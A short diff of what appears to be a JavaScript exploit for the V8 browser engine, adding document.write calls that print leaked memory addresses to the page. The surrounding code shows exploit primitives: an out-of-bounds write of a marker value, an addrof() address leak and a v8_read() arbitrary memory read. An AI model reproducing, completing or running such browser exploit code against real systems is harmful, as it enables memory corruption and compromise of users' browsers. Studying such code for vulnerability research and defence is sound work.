@@ -192,6 +192,7 @@ else{
 leaker_pls[idx] = itof(0x4141414141414141n);
 if (dd_floats[1] == itof(0x4141414141414141n)){
     console.log("Woohoo");
+    document.write("WoHooooo")
 }
 
 dd_floats_idx = idx;
@@ -202,6 +203,7 @@ function addrof(obj){
     var leak = ftoi(leaker_pls[dd_floats_idx + 12]);
     leak = leak & 0xFFFFFFFFn;
     console.log(`addrof: 0x${leak.toString(16)}`)
+    document.write(`addrof: 0x${leak.toString(16)}`)
     return leak;
 }
 
@@ -266,6 +268,7 @@ function v8_read(addr){
     var v8_leak = ftoi(dd_floats[0]);
     v8_leak = v8_leak & 0xFFFFFFFFn;
     console.log(`v8_leak: 0x${v8_leak.toString(16)}`)
+    document.write(`v8_leak: 0x${v8_leak.toString(16)}`)
     return v8_leak;
 }
 
